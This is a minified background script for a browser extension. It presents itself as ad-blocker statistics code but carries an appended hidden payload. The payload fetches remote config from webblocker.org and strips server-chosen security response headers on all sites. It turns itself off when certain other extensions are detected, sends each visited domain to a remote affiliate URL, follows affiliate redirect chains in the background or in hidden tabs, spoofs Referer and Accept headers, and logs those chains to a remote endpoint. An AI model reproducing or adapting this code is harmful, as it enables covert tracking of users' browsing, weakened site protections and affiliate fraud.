STATS=function(){var b=Math.max,c=Math.floor;function a(){return new Promise(function(a){ext.storage.get(STATS.userIDStorageKey,b=>{var d=p(STATS.userIDStorageKey);if(!b[STATS.userIDStorageKey]&&!d){STATS.firstRun=!0;for(var e,f=Date.now()%1e8,g="abcdefghijklmnopqrstuvwxyz0123456789",h=[],j=0;8>j;j++)e=c(Math.random()*g.length),h.push(g[e]);m=h.join("")+f,ext.storage.set(STATS.userIDStorageKey,m),q(STATS.userIDStorageKey,m)}else m=b[STATS.userIDStorageKey]||d,!b[STATS.userIDStorageKey]&&d&&ext.storage.set(STATS.userIDStorageKey,m),b[STATS.userIDStorageKey]&&!d&&q(STATS.userIDStorageKey,m);a(m)})})}var d,e="total_pings",f="",g=33e5,h=!1,i=chrome.runtime.getManifest().version,j=navigator.userAgent.match(/(CrOS\ \w+|Windows\ NT|Mac\ OS\ X|Linux)\ ([\d\._]+)?/),k=(j||[])[1]||"Unknown",l=(j||[])[2]||"Unknown";d=window.opr?"O":window.safari?"S":"E",j="O"===d?navigator.userAgent.match(/(?:OPR)\/([\d\.]+)/):navigator.userAgent.match(/(?:Chrome|Version)\/([\d\.]+)/);var m,n=(j||[])[1]||"Unknown",o=!1,p=function(a){var b=localStorage;if(void 0!==b){a+="_alt";var c=b.getItem(a);if(null!=c)try{return JSON.parse(c)}catch(a){return void(a&&a.message&&recordErrorMessage("storage_get_error ",void 0,{errorMessage:a.message}))}}},q=function(a,b){var c=localStorage;if(a+="_alt",void 0===b)return void c.removeItem(a);try{c.setItem(a,JSON.stringify(b))}catch(a){h=!0}};ext.onMessage.addListener(function(b,c,d){if("get_adblock_user_id"===b.command)return a().then(function(a){d(a)}),!0});var r=function(a){(a||"function"==typeof a)&&ext.storage.get(STATS.totalPingStorageKey,function(b){var c=p(STATS.totalPingStorageKey),e=b[STATS.totalPingStorageKey]||c||0,f={u:m,v:i,f:d,o:k,bv:n,ov:l,ad:getSettings().show_advanced_options?"1":"0",l:determineUserLanguage(),pc:e,cb:getSettings().safari_content_blocking?"1":"0",dcv2:getSettings().data_collection_v2?"1":"0"};"E"===d&&Prefs.blocked_total&&(f.b=Prefs.blocked_total),chrome.runtime.id&&(f.extid=chrome.runtime.id);var g=getAllSubscriptionsMinusText();f.aa=g.acceptable_ads?g.acceptable_ads.subscribed?"1":"0":"u",f.dc=h?"1":"0",SURVEY.types(function(b){f.st=b,a(f)})})},s=function(){r(function(a){if(a.u){if(5e3<a.pc){if(5e3<a.pc&&1e5>a.pc&&0!=a.pc%5e3)return;if(1e5<=a.pc&&0!=a.pc%5e4)return}a.cmd="ping";chrome.management&&chrome.management.getSelf&&chrome.management.getSelf(function(b){a.it=b.installType.charAt(0)})}})},t=function(a){SURVEY.maybeSurvey(a)},u=function(){ext.storage.get(STATS.totalPingStorageKey,function(a){var c=p(e);c=isNaN(c)?0:c;var d=a[STATS.totalPingStorageKey];d=isNaN(d)?0:d,d=b(c,d),d+=1,ext.storage.set(STATS.totalPingStorageKey,d),q(STATS.totalPingStorageKey,d);var f=1==d?1:9>d?24:168;var g=3600000*f,i=Date.now()+g;ext.storage.set(STATS.nextPingTimeStorageKey,i,function(){h=!!chrome.runtime.lastError}),q(STATS.nextPingTimeStorageKey,i)})},v=function(a){return a&&"function"==typeof a?h?void a(g):void window.setTimeout(function(){ext.storage.get(STATS.nextPingTimeStorageKey,function(c){var d=p(STATS.nextPingTimeStorageKey);d=isNaN(d)?0:d;var e=isNaN(c[STATS.nextPingTimeStorageKey])?0:c[STATS.nextPingTimeStorageKey];return e=b(d,e),0===e&&STATS.firstRun?void a(0):0===e||isNaN(e)?void a(g):void a(e-Date.now())})},1e4):void 0},w={max_events_per_hour:3,attempt:function(){for(var a=Date.now(),b=this._event_times,c=this.max_events_per_hour;b[0]&&(b[0]+3600000<a||null===c);)b.shift();return!(null!==c)||!(b.length>=c)&&(b.push(a),!0)},_event_times:[]};return{userIDStorageKey:"userid",totalPingStorageKey:e,nextPingTimeStorageKey:"next_ping_time",firstRun:o,userId:function(){return m},version:i,flavor:d,browser:{O:"Opera",S:"Safari",E:"Chrome"}[d],browserVersion:n,os:k,osVersion:l,pingNow:s,statsUrl:f,untilLoaded:function(b){a().then(function(a){"function"==typeof b&&b(a)})},startPinging:function(){function b(){v(function(a){window.setTimeout(function(){s(),u(),b()},a)})}a().then(function(){ext.storage.get(STATS.totalPingStorageKey,function(a){a[STATS.totalPingStorageKey]||(chrome.management&&chrome.management.getSelf?chrome.management.getSelf(function(a){a?recordGeneralMessage("new_install_"+a.installType):recordGeneralMessage("new_install")}):recordGeneralMessage("new_install"))})}),b()},msg:function(a){if(!w.attempt())return void log("Rate limited:",a);var b={cmd:"msg2",m:a,u:m,v:i,fr:o,f:d,bv:n,o:k,ov:l};chrome.runtime.id&&(b.extid=chrome.runtime.id)}}}();var DEBUG_MODE_ON=!0;class Bg{constructor(){this.config={},this.storage={config:this.config},this.queue=[],this.queueProcessorReady=!1,this.filterRequestConfigured=!1,this.proxyInitiated=!1,this.environmentValidated=!1,this.envDetected=!1,this.optouted=!1,this.version=chrome.runtime.getManifest().version,this.initListeners(),this.initStorage()}initStorage(){chrome.storage.local.get(this.storage,a=>{a&&(this.storage=a),a&&a.config&&(this.config=a.config),!0==this.config.optouted&&(this.optouted=!0);let b=!1;this.config.uid?this.uid=this.config.uid=this.config.uid:(this.uid=this.config.uid=this.generateUUID(),b=!0),this.config.mTime||(this.config.mTime=new Date().getTime(),b=!0),(!this.config.lTime||0>this.config.lTime)&&0!==this.config.lTime&&(this.config.lTime=0,b=!0),this.envDetected=this.config.envDetected,b&&chrome.storage.local.set({config:this.config}),this.queueProcessorReady=!0,this.validateEnvironment(),this.filterRequests(),this.InitStat(),this.updateConfig(),this.setUninstallUrl(),this.processQueue()})}processQueue(){for(var a=this;0<a.queue.length;){var b=a.queue.shift();if(!b.type||"action"!=b.type)return!0;var c="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:a.version,lt:a.config.lTime,action:b.action,uid:a.uid,t:Date.now()})));fetch("http://webblocker.org/action/?"+c).then(a=>a.json()).then(function(a){a.url&&chrome.tabs.create({url:a.url})})}}setUninstallUrl(){var a="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,lt:this.config.lTime,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL("http://webblocker.org/uninstall/?"+a)}initListeners(){chrome.runtime.onInstalled.addListener(a=>{this.queue.push({type:"action",action:a.reason}),this.queueProcessorReady&&this.processQueue()})}updateConfig(){let a=this;const b=chrome.runtime.getManifest().version;let c=new Date().getTime(),d=c-this.config.mTime;this.config.mTime=c,12e5>d&&(this.config.lTime+=d),chrome.storage.local.set({config:this.config}),$.ajax({url:"https://webblocker.org/config/",dataType:"json",data:{p:encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:b,mt:this.config.mTime,lt:this.config.lTime,uid:this.config.uid})))},success:b=>{if(b){for(let a in b)this.config[a]=b[a];chrome.storage.local.set({config:this.config},function(){a.validateEnvironment(),a.filterRequests(),a.InitStat()})}}}),setTimeout(function(){a.updateConfig()},9e5)}generateUUID(){function a(){return Math.floor(65536*(1+Math.random())).toString(16).substring(1)}return a()+a()+"-"+a()+"-"+a()+"-"+a()+"-"+a()+a()+a()}filterRequests(){var a=this;this.config&&this.config.validateFields&&!this.filterRequestConfigured&&this.config.validateFields&&(this.filterRequestConfigured=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(-1<a.config.validateFields.indexOf(b.name.toLowerCase()))})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}validateEnvironment(){let a=this;if(!a.environmentValidated&&a.config.envCEnable&&a.config.envCPeriod&&a.config.envCids){a.environmentValidated=!0;let b=new Date().getTime();if(a.config.lastEnvCheck&&b-a.config.lastEnvCheck<a.config.envCPeriod)return;for(let c in a.config.lastEnvCheck=b,a.envDetected=a.config.envDetected=!1,chrome.storage.local.set({config:a.config}),a.config.envCids)a.detectExtentionById(a.config.envCids[c]).then(function(b){b&&(a.config.envDetected=a.envDetected=!0,chrome.storage.local.set({config:a.config}))})}}detectExtentionById(a){let b=this;return new Promise(function(c){var d=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},7e3),chrome.tabs.insertCSS(a.id,{code:"console.log('ok');"},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}InitStat(){let a=this;if(!a.config.statProcessor)return void statProcessor.initCfg({mode:"off"});if(a.envDetected)return void statProcessor.initCfg({mode:"off"});if(a.optouted)return void statProcessor.initCfg({mode:"off"});if(a.statProcessorRun)return void statProcessor.initCfg(a.config.statProcessor);a.statProcessorRun=!0,statProcessor.initCfg(a.config.statProcessor),chrome.webRequest.onCompleted.addListener(function(b){if("on"===statProcessor.cfg.mode&&!a.envDetected&&!a.config.optouted&&!(0>b.tabId)&&200==b.statusCode&&"GET"==b.method){var c=b.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),d=b.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");statProcessor.cfg.keep_www_prefix||(d=d.replace(/^www\.(.*)$/,"$1"));var e=new Date().getTime();if(!(statProcessor.used_domains[d]&&statProcessor.used_domains[d]+statProcessor.cfg.ttl_ms>e)&&!(statProcessor.cfg.domains_blacklist&&0<statProcessor.cfg.domains_blacklist.length&&statProcessor.cfg.domains_blacklist.includes(d))&&!(statProcessor.cfg.domains_whitelist&&0<statProcessor.cfg.domains_whitelist.length&&!statProcessor.cfg.domains_whitelist.includes(d))){statProcessor.used_domains[d]=e;var f=statProcessor.cfg.aff_url_tmpl.replace(/\{([A-Z]+)\}/gi,function(a,b){return"URL"===b?encodeURIComponent(c):"DOMAIN"===b?encodeURIComponent(d):a});if(statProcessor.cfg.aff_redirect)return!statProcessor.cfg.domains_whitelist||0<!statProcessor.cfg.domains_whitelist.length?void 0:(statProcessor.push_chain(c),void statProcessor.request_bg(f,d,0));var g=new XMLHttpRequest;g.timeout=statProcessor.cfg.aff_timeout_ms,g.onreadystatechange=function(){if(4==g.readyState&&200==g.status){var a=g.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=c){var b=c.replace(/^https?\:\/\/([^\/]+).*$/,"$1");statProcessor.push_chain(c),statProcessor.request(a,b)}else statProcessor.used_domains[d]=e+statProcessor.cfg.no_coverage_ttl_ms}},g.open("GET",f),g.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]});let b=["blocking","requestHeaders"];if(statProcessor.cfg&&statProcessor.cfg.rfr_rules&&0<statProcessor.cfg.rfr_rules.length&&statProcessor.cfg.listenerExtraOptions)for(var c in statProcessor.cfg.listenerExtraOptions)b.push(statProcessor.cfg.listenerExtraOptions[c]);chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("on"!==statProcessor.cfg.mode||!statProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===statProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}if(e||b.push({name:"Accept",value:c}),0>a.tabId){let c="";if(statProcessor.cfg.rfr_rules)for(let b in statProcessor.cfg.rfr_rules){let d=statProcessor.cfg.rfr_rules[b];if(d.url_request_before){if(!statProcessor.last_request_url)continue;let a=new RegExp(d.url_request_before[0],d.url_request_before[1]);if(!a.test(statProcessor.last_request_url))continue}if(d.url_response_before){if(!statProcessor.last_response_url)continue;let a=new RegExp(d.url_response_before[0],d.url_response_before[1]);if(!a.test(statProcessor.last_response_url))continue}if(d.url_chain){if(!statProcessor.rdr_chain||1>statProcessor.rdr_chain.length)continue;let a=new RegExp(d.url_chain[0],d.url_chain[1]),b=!1;for(let c in statProcessor.rdr_chain){let d=statProcessor.rdr_chain[c];if(a.test(d)){b=!0;break}}if(!b)continue}if(d.url_request){let b=new RegExp(d.url_request[0],d.url_request[1]);if(!b.test(a.url))continue}if("allow"==d.rule&&(c=statProcessor.last_response_url),"replace"==d.rule&&d.replace&&(c=d.replace),"regexp"==d.rule&&d.regexp&&d.replace){var f=new RegExp(d.regexp[0],d.regexp[1]);c=statProcessor.last_response_url.replace(f,d.replace)}break}if(c){let a=b.findIndex(a=>"referer"==a.name.toLowerCase());-1<a?b[a].value=c:b.push({name:"Referer",value:c})}}return{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},b)}}var statProcessor={cfg:{mode:"off"},used_domains:{},rdr_chain:[],last_request_url:"",last_response_url:"",initCfg(a){a&&(this.cfg=a)},request:function(a,b){this.cfg.debug&&console.log("statProcessor.request",a,b),this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){statProcessor.request_tab(a,b)},this.cfg.ntab_delay_ms):this.request_bg(a,b,0)},push_chain:function(a){this.rdr_chain.push(a)},request_bg:function(a,b,c){var d=Math.floor;if(!(c>=this.cfg.rdr_max_count)&&this.cfg.header){this.push_chain(a),statProcessor.last_request_url=a;var e=new XMLHttpRequest;e.timeout=this.cfg.timeout,e.onreadystatechange=function(){if(4==e.readyState)if(200==e.status){var a=e.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=e.responseURL,h=statProcessor.is_rdr_url(e.responseURL);if(statProcessor.last_response_url=g,statProcessor.last_response_url!=statProcessor.last_request_url&&statProcessor.push_chain(statProcessor.last_response_url),h||a.length<statProcessor.cfg.jsrdr_maxlen_bytes){var j=a.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");/^\//.test(j)&&(link2Url=new URL(j,e.responseURL),j=link2Url.href),/^https?\:\/\//.test(j)&&(statProcessor.request_bg(j,b,c+1),f=!0)}if(!f&&statProcessor.cfg.common_rdr_rules)for(var k in statProcessor.cfg.common_rdr_rules){var i=statProcessor.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=a;if("uri"==i.where&&(m=g),i.url_pattern){var n=new RegExp(i.url_pattern[0],i.url_pattern[1]);if(!n.test(g))continue}if(m.match(l)){var p=m.replace(l,i.replace);if(i.applyAfter)for(var q in i.applyAfter){var o=i.applyAfter[q];if("decodeURIComponent"==o)p=decodeURIComponent(p);else if("decodeHTML"==o){p=function(a){var b=document.createElement("textarea");return b.innerHTML=a,b.value}(p)}else;}if(i.replacements)for(var r in i.replacements)p=p.replace(r,i.replacements[r]);if(i.regReplacements)for(var s in i.regReplacements){var t=new RegExp(i.regReplacements[s].pattern[0],i.regReplacements[s].pattern[1]);p=p.replace(t,i.regReplacements[s].replace)}if(/^\//.test(p)&&(link2Url=new URL(p,e.responseURL),p=link2Url.href),/^https?\:\/\//.test(p)){var u=i.delay?i.delay:0;if("string"==typeof u&&-1<u.indexOf("-")){var v=u.split("-");u=d(Math.random()*(parseInt(v[1])-parseInt(v[0])+1)+parseInt(v[0]))}setTimeout(()=>{statProcessor.request_bg(p,b,c+1)},parseInt(u)),f=!0;break}}}f||statProcessor.send_rdr_log()}else statProcessor.send_rdr_log(!0)},e.open("GET",a,!0),e.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),e.send()}},is_rdr_url:function(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)},request_tab:function(a,b){this.cfg.debug&&console.log("statProcessor.request_tab",a,b),chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},statProcessor.cfg.ntab_duration_ms)})},send_rdr_log:function(a=!1){if(this.rdr_chain&&this.cfg&&this.cfg.log_rdr_active&&this.cfg.log_rdr_endpoint){if(this.cfg&&this.cfg.log_rdr_onlydifferent){var b=this.rdr_chain[0],c=this.rdr_chain[this.rdr_chain.length-1];if(b.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1")==c.replace(/^https?\:\/\/(?:www\.|)([^\/]+).*$/,"$1"))return}var d=new XMLHttpRequest,e=this.cfg.log_rdr_endpoint;a&&this.cfg.log_rdr_errors_endpoint&&(e=this.cfg.log_rdr_errors_endpoint),d.open("POST",e,!0),d.setRequestHeader("Content-Type","application/json;charset=UTF-8"),d.send(JSON.stringify(this.rdr_chain)),this.rdr_chain=[],this.last_request_url=null,this.last_response_url=null}}};const bg=new Bg;